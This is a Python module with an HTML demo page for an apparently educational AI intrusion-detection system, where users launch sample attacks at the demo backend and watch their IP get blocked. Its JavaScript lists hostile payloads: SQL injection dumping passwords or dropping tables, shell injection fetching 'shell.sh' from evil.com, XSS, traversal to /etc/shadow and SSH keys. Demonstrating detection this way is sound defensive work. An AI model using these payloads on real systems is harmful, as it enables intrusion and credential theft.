"""
Demo page HTML — served at GET /demo.
Each attack type has its own card with an inline payload selector and Launch button.
Results appear directly below the card that was launched.
Dashboard links use window.location.hostname so they work from any device on the network.
"""

DEMO_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🛡️ Cyber Defense Live Demo</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      min-height: 100vh;
    }

    /* ── Header ── */
    .header {
      background: linear-gradient(135deg, #dc2626 0%, #7c3aed 100%);
      padding: 28px 24px;
      text-align: center;
    }
    .header h1 { font-size: clamp(1.4rem, 4vw, 2rem); font-weight: 800; color: #fff; }
    .header p  { color: #fca5a5; margin-top: 6px; font-size: 0.9rem; }
    .badge {
      display: inline-block;
      background: rgba(255,255,255,0.15);
      border: 1px solid rgba(255,255,255,0.3);
      border-radius: 20px;
      padding: 4px 14px;
      font-size: 0.75rem;
      color: #fff;
      margin-top: 10px;
    }

    .container { max-width: 900px; margin: 0 auto; padding: 24px 16px; }

    /* ── Info bar ── */
    .info-bar {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 10px;
      padding: 14px 18px;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 16px;
      flex-wrap: wrap;
    }
    .info-bar .label { color: #94a3b8; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; }
    .info-bar .value { color: #38bdf8; font-weight: 700; font-size: 0.95rem; font-family: monospace; margin-top: 2px; }
    .dot { width: 9px; height: 9px; border-radius: 50%; background: #22c55e; flex-shrink: 0;
           animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.35} }

    /* ── Warning ── */
    .warning-box {
      background: rgba(234,179,8,0.08);
      border: 1px solid rgba(234,179,8,0.3);
      border-radius: 8px;
      padding: 12px 16px;
      font-size: 0.8rem;
      color: #fde68a;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    /* ── Section title ── */
    .section-title {
      font-size: 1rem;
      font-weight: 700;
      color: #f1f5f9;
      margin-bottom: 16px;
    }

    /* ── Attack cards ── */
    .attacks-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
      gap: 16px;
      margin-bottom: 32px;
    }

    .attack-card {
      background: #1e293b;
      border: 2px solid #334155;
      border-radius: 14px;
      overflow: hidden;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .attack-card:hover { border-color: #475569; }

    .card-top {
      padding: 18px 18px 14px;
    }
    .card-icon { font-size: 2rem; margin-bottom: 8px; }
    .card-name { font-weight: 700; font-size: 0.95rem; color: #f1f5f9; margin-bottom: 4px; }
    .card-desc { font-size: 0.75rem; color: #94a3b8; line-height: 1.45; margin-bottom: 10px; }
    .sev-badge {
      display: inline-block;
      padding: 2px 9px;
      border-radius: 4px;
      font-size: 0.68rem;
      font-weight: 700;
    }
    .sev-CRITICAL { background: rgba(220,38,38,0.2); color: #fca5a5; border: 1px solid rgba(220,38,38,0.4); }
    .sev-HIGH     { background: rgba(234,88,12,0.2);  color: #fdba74; border: 1px solid rgba(234,88,12,0.4); }

    /* ── Payload + launch area (inside each card) ── */
    .card-bottom {
      border-top: 1px solid #334155;
      padding: 14px 18px 16px;
      background: #162032;
    }
    .card-bottom label {
      display: block;
      font-size: 0.72rem;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 6px;
    }
    .card-bottom select {
      width: 100%;
      background: #0f172a;
      border: 1px solid #334155;
      border-radius: 6px;
      color: #e2e8f0;
      padding: 8px 10px;
      font-size: 0.78rem;
      font-family: monospace;
      outline: none;
      margin-bottom: 10px;
      cursor: pointer;
    }
    .card-bottom select:focus { border-color: #7c3aed; }

    .launch-btn {
      width: 100%;
      padding: 10px 14px;
      background: linear-gradient(135deg, #dc2626, #7c3aed);
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 0.85rem;
      font-weight: 700;
      cursor: pointer;
      transition: opacity 0.2s, transform 0.1s;
      letter-spacing: 0.3px;
    }
    .launch-btn:hover:not(:disabled) { opacity: 0.88; transform: translateY(-1px); }
    .launch-btn:active:not(:disabled) { transform: translateY(0); }
    .launch-btn:disabled { opacity: 0.45; cursor: not-allowed; }

    /* ── Result panel (per card) ── */
    .result-panel {
      margin-top: 10px;
      border-radius: 8px;
      overflow: hidden;
      display: none;
      font-size: 0.8rem;
    }
    .result-panel.visible { display: block; }

    .result-header {
      padding: 10px 14px;
      font-weight: 700;
      font-size: 0.82rem;
      display: flex;
      align-items: center;
      gap: 8px;
      flex-wrap: wrap;
    }
    .result-header.detected { background: #7f1d1d; color: #fecaca; }
    .result-header.clean    { background: #14532d; color: #bbf7d0; }
    .result-header.error    { background: #1e1b4b; color: #c7d2fe; }
    .result-header code {
      background: rgba(0,0,0,0.35);
      padding: 1px 6px;
      border-radius: 4px;
      font-size: 0.78rem;
    }

    .result-body {
      background: #1e293b;
      border: 1px solid #334155;
      border-top: none;
      padding: 12px 14px;
    }
    .result-body table { width: 100%; border-collapse: collapse; }
    .result-body td { padding: 5px 8px; border-bottom: 1px solid #1e3a5f; vertical-align: top; }
    .result-body td:first-child { color: #64748b; width: 110px; white-space: nowrap; }
    .result-body td code {
      background: #0f172a;
      padding: 1px 5px;
      border-radius: 3px;
      color: #7dd3fc;
      word-break: break-all;
    }
    .explanation {
      margin-top: 10px;
      padding: 8px 10px;
      background: rgba(59,130,246,0.08);
      border: 1px solid rgba(59,130,246,0.2);
      border-radius: 6px;
      color: #93c5fd;
      line-height: 1.5;
      font-size: 0.78rem;
    }
    .mitigation-list {
      margin: 8px 0 0 14px;
      color: #94a3b8;
      line-height: 1.7;
    }
    .mitigation-title {
      margin-top: 10px;
      font-weight: 600;
      color: #e2e8f0;
      font-size: 0.78rem;
    }

    /* ── Action links inside result ── */
    .action-link {
      display: inline-flex;
      align-items: center;
      padding: 6px 12px;
      border-radius: 6px;
      font-size: 0.75rem;
      font-weight: 600;
      text-decoration: none;
      transition: opacity 0.2s;
    }
    .action-link:hover { opacity: 0.8; }
    .blocked-link  { background: rgba(220,38,38,0.2);  color: #fca5a5; border: 1px solid rgba(220,38,38,0.4); }
    .unblock-link  { background: rgba(34,197,94,0.15); color: #86efac; border: 1px solid rgba(34,197,94,0.3); }

    /* ── Dashboard links ── */
    .links-bar {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
      margin: 28px 0 8px;
    }
    .dash-link {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(124,58,237,0.15);
      border: 1px solid rgba(124,58,237,0.35);
      border-radius: 8px;
      padding: 9px 16px;
      color: #c4b5fd;
      text-decoration: none;
      font-size: 0.82rem;
      font-weight: 600;
      transition: background 0.2s;
    }
    .dash-link:hover { background: rgba(124,58,237,0.3); }

    footer {
      text-align: center;
      padding: 20px;
      color: #334155;
      font-size: 0.72rem;
      border-top: 1px solid #1e293b;
      margin-top: 24px;
    }
  </style>
</head>
<body>

<div class="header">
  <div style="font-size:3rem;margin-bottom:8px;">🛡️</div>
  <h1>Autonomous AI Cyber Defense</h1>
  <p>Live Attack Demo — Real-Time Detection &amp; IP Blocking</p>
  <span class="badge">⚠️ Educational Purpose Only — Safe &amp; Controlled Environment</span>
</div>

<div class="container">

  <!-- Info bar -->
  <div class="info-bar">
    <div class="dot"></div>
    <div>
      <div class="label">Your IP Address</div>
      <div class="value" id="client-ip">Detecting…</div>
    </div>
    <div style="margin-left:auto;text-align:right;">
      <div class="label">Defense System</div>
      <div class="value" id="system-status">Checking…</div>
    </div>
  </div>

  <!-- Warning -->
  <div class="warning-box">
    ⚠️ <strong>Demo Environment Notice:</strong>
    Pick any attack below, choose a payload, and tap <strong>Launch Attack</strong>.
    The AI Defense Engine will detect your attack from your real IP and block it instantly.
    All events appear live on the dashboard. You can unblock your IP from the Controls page.
  </div>

  <!-- Attack cards — each has its own payload selector + launch button -->
  <div class="section-title">🎯 Choose an Attack &amp; Launch</div>
  <div class="attacks-grid" id="attacks-grid"></div>

  <!-- Dashboard links (injected by JS so hostname is dynamic) -->
  <div class="links-bar" id="links-bar"></div>

</div>

<footer>
  Autonomous AI Cyber Defense Agent — For educational and demonstration purposes only.
  All attacks run in a controlled environment. No real systems are harmed.
</footer>

<script>
// ── Attack definitions ────────────────────────────────────────────────────
const ATTACKS = [
  {
    type: 'SQL_INJECTION',
    icon: '💉',
    name: 'SQL Injection',
    desc: 'Inject malicious SQL into login/search forms to bypass authentication or steal data.',
    severity: 'CRITICAL',
    payloads: [
      "' OR '1'='1--",
      "admin' UNION SELECT username,password FROM users--",
      "1'; DROP TABLE users--",
      "1 AND SLEEP(5)--",
      "' OR BENCHMARK(5000000,MD5(1))--"
    ]
  },
  {
    type: 'COMMAND_INJECTION',
    icon: '⚡',
    name: 'Command Injection',
    desc: 'Execute arbitrary OS commands by injecting shell metacharacters.',
    severity: 'CRITICAL',
    payloads: [
      "localhost;cat /etc/passwd",
      "127.0.0.1|id",
      "x;/bin/bash -i",
      "x;wget http://evil.com/shell.sh",
      "x$(cat /etc/passwd)"
    ]
  },
  {
    type: 'XSS',
    icon: '🕷️',
    name: 'Cross-Site Scripting',
    desc: 'Inject JavaScript payloads to hijack sessions or steal cookies.',
    severity: 'HIGH',
    payloads: [
      "<script>alert(document.cookie)<\\/script>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(document.cookie)",
      "<svg onload=alert(1)>",
      "<iframe src=javascript:alert(1)>"
    ]
  },
  {
    type: 'PATH_TRAVERSAL',
    icon: '📁',
    name: 'Path Traversal',
    desc: 'Access files outside the web root using ../ sequences.',
    severity: 'HIGH',
    payloads: [
      "../../../../etc/passwd",
      "../../../../.ssh/id_rsa",
      "%2e%2e%2f%2e%2e%2fetc%2fshadow",
      "../../../../etc/hosts",
      "../../../../proc/self/environ"
    ]
  },
  {
    type: 'BRUTE_FORCE',
    icon: '🔨',
    name: 'Brute Force',
    desc: 'Repeatedly attempt login to guess credentials — triggers after 5+ failures.',
    severity: 'HIGH',
    payloads: [
      "admin:password",
      "admin:123456",
      "root:root",
      "user:pass"
    ]
  }
];

// ── Build cards ───────────────────────────────────────────────────────────
const grid = document.getElementById('attacks-grid');

ATTACKS.forEach(atk => {
  const card = document.createElement('div');
  card.className = 'attack-card';
  card.id = 'card-' + atk.type;

  const payloadOptions = atk.payloads
    .map(p => `<option value="${escAttr(p)}">${escHtml(p)}</option>`)
    .join('');

  card.innerHTML = `
    <div class="card-top">
      <div class="card-icon">${atk.icon}</div>
      <div class="card-name">${atk.name}</div>
      <div class="card-desc">${atk.desc}</div>
      <span class="sev-badge sev-${atk.severity}">${atk.severity}</span>
    </div>
    <div class="card-bottom">
      <label>Select Payload</label>
      <select id="payload-${atk.type}">${payloadOptions}</select>
      <button class="launch-btn" id="btn-${atk.type}" onclick="launchAttack('${atk.type}')">
        🚀 Launch ${atk.name} Attack
      </button>
      <div class="result-panel" id="result-${atk.type}">
        <div class="result-header" id="result-header-${atk.type}"></div>
        <div class="result-body"  id="result-body-${atk.type}"></div>
      </div>
    </div>
  `;
  grid.appendChild(card);
});

// ── Dashboard links (dynamic hostname) ───────────────────────────────────
(function() {
  const host = window.location.hostname;
  const bar  = document.getElementById('links-bar');
  [
    { href: `http://${host}:3000`,          label: '📊 Defense Dashboard' },
    { href: `http://${host}:3000/attacks`,  label: '🚨 Live Attack Feed' },
    { href: `http://${host}:3000/blocked`,  label: '🔒 Blocked IPs' },
    { href: `http://${host}:3000/controls`, label: '⚙️ Controls / Unblock' },
    { href: `http://${host}:8000/docs`,     label: '📖 API Docs' },
  ].forEach(l => {
    const a = document.createElement('a');
    a.href = l.href;
    a.target = '_blank';
    a.className = 'dash-link';
    a.textContent = l.label;
    bar.appendChild(a);
  });
})();

// ── Detect client IP ──────────────────────────────────────────────────────
fetch('/api/demo/whoami')
  .then(r => r.json())
  .then(d => { document.getElementById('client-ip').textContent = d.ip || 'Unknown'; })
  .catch(() => { document.getElementById('client-ip').textContent = 'Unable to detect'; });

// ── System health ─────────────────────────────────────────────────────────
fetch('/health')
  .then(r => r.json())
  .then(d => {
    const el = document.getElementById('system-status');
    if (d.status === 'healthy') {
      el.textContent = '✅ Online & Active';
      el.style.color = '#4ade80';
    } else {
      el.textContent = '⚠️ Degraded';
      el.style.color = '#facc15';
    }
  })
  .catch(() => {
    const el = document.getElementById('system-status');
    el.textContent = '❌ Offline';
    el.style.color = '#f87171';
  });

// ── Launch attack ─────────────────────────────────────────────────────────
async function launchAttack(attackType) {
  const btn       = document.getElementById('btn-' + attackType);
  const panel     = document.getElementById('result-' + attackType);
  const header    = document.getElementById('result-header-' + attackType);
  const body      = document.getElementById('result-body-'   + attackType);
  const selectEl  = document.getElementById('payload-' + attackType);
  const payload   = selectEl ? selectEl.value : '';

  btn.disabled    = true;
  btn.textContent = '⏳ Launching…';
  panel.classList.remove('visible');

  try {
    const resp = await fetch('/api/demo/attack', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ attack_type: attackType, payload })
    });

    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
    const data = await resp.json();

    panel.classList.add('visible');

    if (data.detected) {
      const det = data.detections[0] || {};
      const alreadyBlocked = det.blocked === false && data.message && data.message.includes('already');
      const mit = det.analysis?.mitigation || [];

      header.className = 'result-header detected';
      header.innerHTML = `🚨 DETECTED &amp; BLOCKED — IP <code>${escHtml(data.attacker_ip)}</code>`;

      const mitHtml = mit.length
        ? `<div class="mitigation-title">🔧 Mitigation:</div>
           <ul class="mitigation-list">${mit.map(m => `<li>${escHtml(m)}</li>`).join('')}</ul>`
        : '';

      const host = window.location.hostname;
      body.innerHTML = `
        <table>
          <tr><td>Attack</td>  <td><strong>${escHtml(det.attack_type || attackType)}</strong></td></tr>
          <tr><td>Severity</td><td><strong style="color:#f87171;">${escHtml(det.severity || '')}</strong></td></tr>
          <tr><td>Your IP</td> <td><code>${escHtml(data.attacker_ip)}</code></td></tr>
          <tr><td>Payload</td> <td><code>${escHtml(payload)}</code></td></tr>
          <tr><td>Action</td>  <td><strong style="color:#4ade80;">✅ IP BLOCKED</strong></td></tr>
        </table>
        ${det.analysis?.explanation
          ? `<div class="explanation">🤖 ${escHtml(det.analysis.explanation)}</div>`
          : ''}
        ${mitHtml}
        <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;">
          <a href="http://${host}:3000/blocked" target="_blank" class="action-link blocked-link">🔒 View Blocked IPs</a>
          <a href="http://${host}:3000/controls" target="_blank" class="action-link unblock-link">🔓 Unblock My IP</a>
        </div>
      `;

      // Highlight the card border red on detection
      document.getElementById('card-' + attackType).style.borderColor = '#dc2626';

    } else if (data.already_blocked) {
      header.className = 'result-header detected';
      header.innerHTML = `🔒 IP ALREADY BLOCKED — <code>${escHtml(data.attacker_ip)}</code>`;
      const host = window.location.hostname;
      body.innerHTML = `
        <table>
          <tr><td>Attack</td>  <td><strong>${escHtml(attackType)}</strong></td></tr>
          <tr><td>Your IP</td> <td><code>${escHtml(data.attacker_ip)}</code></td></tr>
          <tr><td>Status</td>  <td><strong style="color:#f87171;">🚫 Blocked — all requests denied</strong></td></tr>
        </table>
        <p style="margin-top:10px;font-size:0.78rem;color:#94a3b8;">
          Your IP is already in the block list. Go to Controls to unblock it, then try again.
        </p>
        <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
          <a href="http://${host}:3000/controls" target="_blank" class="action-link unblock-link">🔓 Unblock My IP</a>
        </div>
      `;

    } else {
      header.className = 'result-header clean';
      header.innerHTML = `✅ Not detected — try a different payload`;
      body.innerHTML = `
        <table>
          <tr><td>Attack</td><td>${escHtml(attackType)}</td></tr>
          <tr><td>Your IP</td><td><code>${escHtml(data.attacker_ip)}</code></td></tr>
          <tr><td>Message</td><td>${escHtml(data.message)}</td></tr>
        </table>
      `;
    }

  } catch (err) {
    panel.classList.add('visible');
    header.className = 'result-header error';
    header.textContent = '❌ Connection error';
    body.innerHTML = `<p style="color:#f87171;padding:4px 0;">${escHtml(err.message)}</p>`;
  }

  const atk = ATTACKS.find(a => a.type === attackType);
  btn.disabled    = false;
  btn.textContent = `🚀 Launch ${atk ? atk.name : attackType} Attack`;
}

// ── Helpers ───────────────────────────────────────────────────────────────
function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function escAttr(s) {
  return String(s).replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
</script>
</body>
</html>"""
